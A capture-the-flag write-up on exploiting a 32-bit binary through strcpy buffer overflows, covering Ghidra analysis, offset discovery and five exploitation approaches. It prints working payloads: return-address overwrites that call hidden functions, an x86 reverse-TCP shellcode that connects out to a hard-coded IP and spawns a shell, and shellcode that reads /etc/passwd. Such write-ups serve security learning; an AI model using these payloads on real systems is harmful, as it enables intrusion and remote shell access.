We were given a binary file and an address to connect to. Upon
connection, I was prompted to enter a password and a message. However,
since I entered the wrong password, the program ended -- nothing
interesting happened.

![Text Description automatically
generated](images/media/image1.png)

Given that I have to exploit that binary to get the flag when executed,
it requires 2 arguments -- password & content (message)

![Text Description automatically generated with low
confidence](images/media/image2.png)

When executed, with correct arguments, the program exits with access
denied as shown from the ncat connection.

![Graphical user interface, text Description automatically
generated](images/media/image3.png)

By playing around with it, I got a segfault when attempting 100 bytes in
the password field

![Text Description automatically
generated](images/media/image4.png)

Next, I launched Ghidra to perform some reverse engineering to determine
what was happening behind the scenes.

It looks like there were 6 created functions within the binary file.

![A picture containing diagram Description automatically
generated](images/media/image5.png)

The "main" function attempt to pass the 1st argument to the passw
function. It also made accessing the arguments globally. I didn't
understand what was going on between lines 9-14 but it didn't seem to
really matter.

![Graphical user interface, text, application Description automatically
generated](images/media/image6.png)

In the "passw" function, it makes a buffer of 22 bytes. A strcpy is made
with the 1^st^ argument and pass_buffer (vulnerable). The data is then
passed to the hash function which hashes the string. If the hash matches
993882141 (decimal), it calls the "write" function else prints out
access denied.

![Text Description automatically
generated](images/media/image7.png)

In the write function, we can see another vulnerable strcpy of the 2^nd^
argument to a buffer of 200 bytes. The "fopen" function is called that
opens message.txt and dumps the contents of the 2^nd^ argument into it
which is the message.

Also, to mention, it checks if the variable x (I believe it's a global
variable) is 1 before printing something.

![Text Description automatically
generated](images/media/image8.png)

There is a function called "uselessFunction" which caught my attention.
It takes in the 3^rd^ argument as a key which was not mentioned in the
help usage. So, it checks if the key entered matches "STANDCON22". If it
does, it prints out a fake flag.

I took note that it makes sure that if the 3^rd^ argument is Null, it
doesn't change the value of global variable x to 1

![Graphical user interface, text, application Description automatically
generated](images/media/image9.png)

Finally, there is this last function called "getinfo" (not called at
all) which only prints out the below strings. It states that the
password is found at /etc/passwd. It also mentions that we can access
the key prompt from the server using the following trick. The last info
describes how we can inject python commands into the server.

![Graphical user interface, text, application Description automatically
generated](images/media/image10.png)

So, in summary, if the secretcoms binary creates a buffer of 22 bytes
for the first argument, the password. If the user enters the right
password, it will call the write function. This function then parses the
2^nd^ argument (content) into a 200 bytes buffer which will be dumped to
message.txt. There is an uncalled function named uselessFunction that
prints out a fake flag locally and changes the default value of the
global variable "x" that allows something to be printed in the write
function.

From all that information, I could think of some possible approaches to
exploit this binary which I listed below

Approach 1: (Failed)

Command Injection since it looks like whatever is being collected by the
server is being executed directly into the terminal. This is because the
binary tells us we can place in a python command which would be executed
from the server. Then we can search for the flag

I tried a POC below which proves my hypothesis. However, it looks like
it is redirecting the stdout into the program while stderr into the
terminal

![Text Description automatically
generated](images/media/image11.png)

So, I tried injecting both bind & reverse shell however had some trouble
getting a shell. I even tried starting a python HTTP server to view the
files in the current directory but failed. I believe there is some sort
of strong firewall rules being implemented that is preventing me from
doing all this.

![Text Description automatically
generated](images/media/image12.png)

![Graphical user interface, text, application, email Description
automatically
generated](images/media/image13.png)

Since I knew, stderr gets displayed in the terminal, I decided to
execute commands like "as \<filename\>" to perform some reconnaissance
however couldn't gather much.

![Text Description automatically
generated](images/media/image14.png)

From the "getinfo" function, it stated to look at the file "/etc/passwd"
to retrieve the password however upon attempting, the command hung
before disconnecting.

![Text Description automatically
generated](images/media/image15.png)

I tried some other syntax, which got me some content of /etc/passwd -
not all. Which indicated some sanitization is being conducted but there
wasn't anything useful retrieved. Thus, I dropped this approach

![Text Description automatically
generated](images/media/image16.png)

Approach 2: (Failed)

Illegally call the "uselessFunction" that might print out the actual
flag from the server. To do so, I had to determine where the binary
crashes for the 1^st^ argument thus used Metasploit pattern_create and
pattern_offset.

Upon injecting the pattern, the program crashed at "41346241". Upon
querying, the offset is at 42

![Text Description automatically
generated](images/media/image17.png)

I executed the following command to retrieve the address of the
"uselessFunction" function which indicated that it started at 0x08048710

![Text Description automatically
generated](images/media/image18.png)

Thus, I came up with the following payload that illegally calls the
"uselessFunction" function and used the key "STANDCON22" to print out
the flag. This worked locally.

\$(python2 -c \"print \'A\'\*42 + \'\\x10\\x87\\x04\\x08\'\")

![Graphical user interface, text, application Description automatically
generated](images/media/image19.png)

However, when tried remotely, my disappointment was immeasurable, and my
day was ruined. I got the fake flag instead.

![Text Description automatically
generated](images/media/image20.png)

Approach 3: (Failed)

Illegally call the "write" function that allows us to inject a large
shellcode to achieve RCE. Using some of the intel got from approach 2, I
know that the offset of the 1^st^ buffer is 42. So next I determined the
function address of the address "write" which was located at 0x08048676.

![Graphical user interface, text Description automatically
generated](images/media/image21.png)

By doing so I crafted the below payload for the password field to call
the write function illegally without requiring the right password. From
the screenshot, we can see the message was added to message.txt without
the right password.

\$(python2 -c \"print \'A\'\*42 + \'\\x76\\x86\\x04\\x08\'\")

![Text Description automatically
generated](images/media/image22.png)

Next, I needed to determine the offset of the message field thus again
using Metasploit pattern_create and pattern_offset. Turns out it was 216

![Text Description automatically
generated](images/media/image23.png)

Next, I crafted my payload for the message input. I'll be using a
reverse TCP x86 bit shellcode
(<https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/>)
thus forming the following final payload

Used 40 bytes of padding and 102 bytes of NOP.

40 + 102 + 74 (shellcode length) = 216

The message payload without the appropriate address will look like this:

\$(python2 -c \'print \"\\x90\" \* 102 + \"
\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68\\xc0\\xa8\\xb5\\x82\\x66\\x68\\x27\\x0f\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\x43\\xcd\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"
+ \"A\"\*40 + \"BBBB\"\')

I next determined the return address using GDB and chose \\xffffcf44

![A screenshot of a computer Description automatically generated with
medium
confidence](images/media/image24.png)

Thus, when I substituted the return address from the B's, I was able to
get a local shell -- a working POC

![Text Description automatically
generated](images/media/image25.png)

![Text Description automatically
generated](images/media/image26.png)

However, when executed on the server, it returned a segmentation fault.
This meant that I wasn't using the right address where the NOP existed
as it varies from different machines. Thus, I won't be able to get a
reverse shell using this approach

![Text Description automatically
generated](images/media/image27.png)

Approach 4: (Failed)

Knowing that if variable x is changed to value 1, it prints something in
the "write" function when called. The value of global x is changed to 1
by calling the "uselessFunction" function. So wanting to know what this
value is, using the intel I got from approach 2, I can illegally call
the "uselessFunction" function.

Next, I need to call the "write" function from the "uselessFunction"
function. I realized this is possible because a strcpy is being made
thus to determine the offset, I again had to use Metasploit
pattern_create and pattern_offset. The offset was at 22.

![A picture containing text Description automatically
generated](images/media/image28.png)

I came up with the following payload that first illegally calls the
"uselessFunction" function which changes the global value x to 1 and
then illegally calls the "write" function which prints out the unknown
value I have been waiting to find out.

Turns out this value is an address of something in the binary during
execution. I also realized that the addresses within the binary doesn't
change for every execution that states ASLR is disabled internally
within the program

\$(python2 -c \"print \'A\'\*42 + \'\\x10\\x87\\x04\\x08\'\") test
\$(python2 -c \"print \'A\'\*22 + \'\\x76\\x86\\x04\\x08\'\")

![Text Description automatically
generated](images/media/image29.png)

To determine what that address meant, I launched the GDB. After playing
around for 10min I got what the address was pointing to.

![A screen shot of a computer Description automatically generated with
low
confidence](images/media/image30.png)

When it ran the payload, it printed the address 0xffffcfd8. When I
printed the ESP of the 'write' function, it showed the same address.
Which meant the printed address when pointing to the stack pointer of
the current function which in this case is the "write" function.

![Graphical user interface, text Description automatically generated
with medium
confidence](images/media/image31.png)

So, this time, using the same reverse shellcode used in approach 3, I am
now able to successfully point it to the address where the NOP existed
even though if the binary is executed on a different machine (because
the ESP is printed out -- a rough idea where the NOP starts)

On the server, I executed the payload where the return address is not
pointing to the right NOP address. So, I should get a segmentation fault
which I got. At the same time, I got the stack address of the "write"
function on the server 0xffffdb78.

![Text Description automatically
generated](images/media/image32.png)

I recrafted my payload with the appropriate NOP address in the return
address for the server. Upon executing, I didn't get back any output
Immediately. After a few min, I got back an output without any
segmentation fault. This is a good sign stating that the reverse
shellcode was executed.

![Text Description automatically
generated](images/media/image33.png)

However, when I looked at my ncat connection, I didn't get any shell. I
then recalled that there might be a strict firewall rule implemented on
the server that is preventing me to get a reverse shell. I tried
different shellcodes and even bind shell but no luck.

![Text Description automatically
generated](images/media/image34.png)

Approach 5: (Successful)

Nearly all hope was lost. I decided to look at the clues from the
"getInfo" function in the binary. I then realized I didn't utilize the
first clue properly -- the password is found at /etc/passwd. I felt that
it is hinting to me to take a look at the "/etc/passwd" on the server
directly without the need for the reverse or bind shell

So, for a bypass, I got a shellcode that cats out /etc/passwd. Such
shellcodes can be found online. I found one here \>
<http://shell-storm.org/shellcode/files/shellcode-571.php>

Using intel I got from approach 4, I crafted one below for the message
input: 40 + 133 + 43 + (addr) = 220

\$(python2 -c \'print \"\\x90\" \* 133 +
\"\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\"
+ \"A\"\*40 + \"\\xf8\\xce\\xff\\xff\"\')

So, my final payload looked like this:

\$(python2 -c \"print \'A\'\*42 + \'\\x10\\x87\\x04\\x08\'\") key

\$(python2 -c \"print \'A\'\*22 + \'\\x76\\x86\\x04\\x08\'\")

\$(python2 -c \'print \"\\x90\" \* 133 +
\"\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\"
+ \"A\"\*40 + \"\\x98\\xdb\\xff\\xff\"\')

When used them on the server, I managed to print out /etc/passwd and
that was where the flag was.

![Text Description automatically
generated](images/media/image35.png)
